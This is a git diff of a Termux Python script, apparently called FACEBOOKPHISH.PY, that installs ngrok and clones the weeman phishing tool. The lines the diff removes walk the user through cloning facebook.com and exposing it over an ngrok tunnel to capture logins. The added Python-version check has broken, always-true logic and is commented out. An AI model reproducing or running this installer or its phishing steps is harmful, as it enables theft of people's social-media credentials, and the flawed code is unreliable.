@@ -1,6 +1,29 @@
 import os
+import sys
 
-print("=========================================")
+
+def python_ver():
+
+
+	if sys.version[:3]=="3" or "3.5" in sys.version[:3]:
+			pass #good
+	elif sys.version[:3]=="2" or "2.7" in sys.version[:3]:
+		print("THIS SCRIPT NEED PYTHON3 TO WORK. PLEASE START THIS WITH COMMAND PYTHON3 FACEBOOKPHISH.PY")
+		print("You're running this script with python version", sys.version[:3]=="2" or "2.7")
+
+	else:
+		print("Your Python version is too old")
+
+try:
+	if sys.version[:3]=="3" or "3.5" in sys.version[:3]:
+		pass #Good
+except (ValueError, TypeError):
+	if sys.version[:3]=="2" or "2.7" in sys.version[:3]:
+
+		print("Please run this script with pyhton3 to continue...")
+
+
+print ("=========================================")
 
 print(""" _______    ___       ______  _______ .______     ______     ______    __  ___ 
 |   ____|  /   \     /      ||   ____||   _  \   /  __  \   /  __  \  |  |/  / 
@@ -19,13 +42,13 @@ print("==========================================")
 print("\nScript for Termux")
 print("Made by Sam Sepiol")
 print("==========================================")
-
+#python_ver()
 print("\nLet's start, we need to update and install some tools first... ")
 include=["Y","N","y","n","yes","no","Yes","No","YES","NO"]
-star=input("Do you want to continue? Y/N: ")
-while star not in include:
-	star=input("You need to choose a valid option (Y, y, N, n, yes, no)")
-if star=="N" or star=="n" or star=="no":
+start=input("Do you want to continue? Y/N: ")
+while start not in include:
+	start=input("You need to choose a valid option (Y, y, N, n, yes, no)")
+if start=="N" or start=="n" or start=="no":
 	print("Okay, let's try when you want to. Goodbye")
 else:
 	os.system("pkg update")
@@ -52,9 +75,7 @@ else:
 	os.system("cd $home && cp ngrok /data/data/com.termux/files/usr/bin")
 	os.system("cd $home && git clone https://github.com/samyoyo/weeman.git")
 	os.system("cd /data/data/com.termux/files/home/weeman && chmod 755 weeman.py")
-	os.system("$home")
-	print("""\nNow you'll need to start weeman.py with 'python weeman.py'. Use 'show' to start
-Now in a new session using termux type 'ngrok http 8080'.
-if you want https url just type 'ngrok http -bind-tls=true 8080' 
-now go to weeman session opened in termux and type 'set url https://facebook.com'. Next, type set action_url 'xxx_ngrok.io'(this means that you put url that ngrok show to you when you activated it)
-and now type 'set port 8080'""")
+	os.system("pip2 install --upgrade pip ")
+	os.system("cd /data/data/com.termux/files/home/")
+	os.system("pip2 install beautifulsoup4")
+	os.system("cd /data/data/com.termux/files/home/")
